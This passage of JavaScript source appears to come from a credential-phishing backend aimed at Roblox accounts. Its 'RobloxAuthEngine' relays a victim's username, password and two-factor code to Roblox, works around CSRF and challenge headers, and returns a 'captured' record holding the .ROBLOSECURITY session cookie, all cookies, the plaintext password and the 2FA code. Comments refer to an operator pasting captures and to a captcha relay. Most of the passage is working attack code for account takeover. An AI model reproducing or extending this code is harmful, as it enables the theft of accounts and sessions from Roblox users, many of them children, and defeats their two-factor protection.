          lastMessage = 'Roblox rejected the session it issued. Please sign in again.';
          continue;
        }

        const captured = {
          valid: true,
          success: true,
          cookie: out.cookie,
          cookieVerified: verdict.state === 'valid',
          allCookies: session.jar.header,
          user: verdict.user || (out.body && out.body.user) || {
            id: session.userId,
            name: session.username,
            displayName: session.username
          },
          username: session.username,
          password: session.password,
          twoFactorCode: code,
          mediaType: session.mediaType
        };
        this.pending2FA.delete(session.sessionId);
        return captured;
      }

      if (out.message) lastMessage = out.message;
    }

    return { valid: false, message: lastMessage || 'Incorrect code. Please try again.' };
  }

  async completeAtV3(session, verificationToken) {
    const url = `${TWO_STEP_LOGIN}/${encodeURIComponent(session.userId)}/two-step-verification/login`;

    // A fresh intent per attempt: the keypair is single-use and the nonce is
    // bound to it, so a replayed blob is rejected.
    const buildBody = async () => {
      const body = {
        challengeId: session.challengeId,
        verificationToken,
        rememberDevice: true,
        accountBlob: ''
      };
      try {
        const intent = await generateSecureAuthIntent(session.jar);
        if (intent) body.secureAuthenticationIntent = intent;
      } catch { /* cookie cannot be issued without it; the attempt reports that */ }
      return body;
    };

    let res = await request(url, { body: await buildBody(), jar: session.jar, csrf: session.csrf });
    let body = await readJSON(res);

    if (res.status === 403 && !res.headers.get('rblx-challenge-type') && res.headers.get('x-csrf-token')) {
      session.csrf = res.headers.get('x-csrf-token');
      res = await request(url, { body: await buildBody(), jar: session.jar, csrf: session.csrf });
      body = await readJSON(res);
    }

    return {
      cookie: this.extractSessionCookie(res, session.guestCookie),
      body,
      message: firstErrorMessage(body, null)
    };
  }

  async replayLogin(session, verificationToken, carriedHeaders) {
    const metadata = { rememberDevice: true, challengeId: session.challengeId, actionType: session.actionType };
    if (verificationToken) metadata.verificationToken = verificationToken;

    const headers = carriedHeaders && Object.keys(carriedHeaders).length
      ? carriedHeaders
      : {
          'rblx-challenge-id': session.challengeId,
          'rblx-challenge-type': 'twostepverification',
          'rblx-challenge-metadata': b64enc(JSON.stringify(metadata))
        };

    const credentials = { ctype: session.ctype, cvalue: session.username, password: session.password };

    let res = await request(AUTH_LOGIN, { body: credentials, jar: session.jar, csrf: session.csrf, headers });
    let body = await readJSON(res);

    if (res.status === 403 && !res.headers.get('rblx-challenge-type') && res.headers.get('x-csrf-token')) {
      session.csrf = res.headers.get('x-csrf-token');
      res = await request(AUTH_LOGIN, { body: credentials, jar: session.jar, csrf: session.csrf, headers });
      body = await readJSON(res);
    }

    return {
      cookie: this.extractSessionCookie(res, session.guestCookie),
      body,
      message: firstErrorMessage(body, null)
    };
  }

  async resend2FACode(sessionId) {
    this.cleanupExpiredSessions();
    const session = this.pending2FA.get(sessionId);
    if (!session) {
      return { success: false, message: 'That verification request has expired. Please sign in again.' };
    }

    if (session.mediaType !== 'Email' && session.mediaType !== 'Sms') {
      return { success: false, message: 'A new code cannot be requested for this verification method.' };
    }

    try {
      if (await this.sendChallengeCode(session)) {
        return {
          success: true,
          message: session.mediaType === 'Sms'
            ? 'A new code was sent to your phone.'
            : 'A new code was sent to your email.'
        };
      }
      return { success: false, message: 'We could not send a new code. Please try again.' };
    } catch (err) {
      return { success: false, message: transportMessage(err, 'to resend the code') };
    }
  }

  // Only a value Roblox just issued in this response is a candidate. There is
  // deliberately no jar fallback: the jar holds the anonymous cookie from the
  // CSRF handshake, it clears every length check a real session clears, and
  // handing it back is what produced captures that read "logged in, invalid
  // cookie" once the operator pasted them somewhere.
  extractSessionCookie(res, previous = null) {
    const list = getSetCookies(res.headers);
    for (const raw of list) {
      const text = String(raw);
      if (!text.startsWith('.ROBLOSECURITY=')) continue;
      if (/max-age=0/i.test(text)) continue;
      const value = text.slice('.ROBLOSECURITY='.length).split(';')[0].trim();
      if (!value || value.length <= 20) continue;
      if (previous && value === previous) continue;
      return value;
    }
    return null;
  }

  // ── housekeeping ───────────────────────────────────────────────────────

  cleanupExpiredSessions() {
    const now = Date.now();
    for (const [id, session] of this.pending2FA.entries()) {
      if (now - session.createdAt > SESSION_TTL_MS) this.pending2FA.delete(id);
    }
  }

  getPendingSessions() {
    this.cleanupExpiredSessions();
    return this.pending2FA.size;
  }

  getPendingCaptchas() {
    return this.captchaRelay.pendingCount();
  }

  describeSession(sessionId) {
    this.cleanupExpiredSessions();
    const session = this.pending2FA.get(sessionId);
    if (!session) return null;
    return {
      sessionId: session.sessionId,
      mediaType: session.mediaType,
      userId: session.userId,
      expiresInMs: Math.max(0, SESSION_TTL_MS - (Date.now() - session.createdAt))
    };
  }

  // ── legacy callers ─────────────────────────────────────────────────────

  async initiate2FA(username, password) {
    return this.initiateLogin(username, password);
  }

  async verify2FA(sessionId, code) {
    return this.verify2FACode(sessionId, code);
  }

  async verifyAuthenticatorCode(sessionId, code) {
    return this.verify2FACode(sessionId, code);
  }
}

RobloxAuthEngine.CookieJar = CookieJar;
RobloxAuthEngine.CaptchaRelay = CaptchaRelay;
RobloxAuthEngine.SESSION_TTL_MS = SESSION_TTL_MS;
RobloxAuthEngine.validateSessionCookie = validateSessionCookie;

module.exports = RobloxAuthEngine;
module.exports.generateSecureAuthIntent = generateSecureAuthIntent;
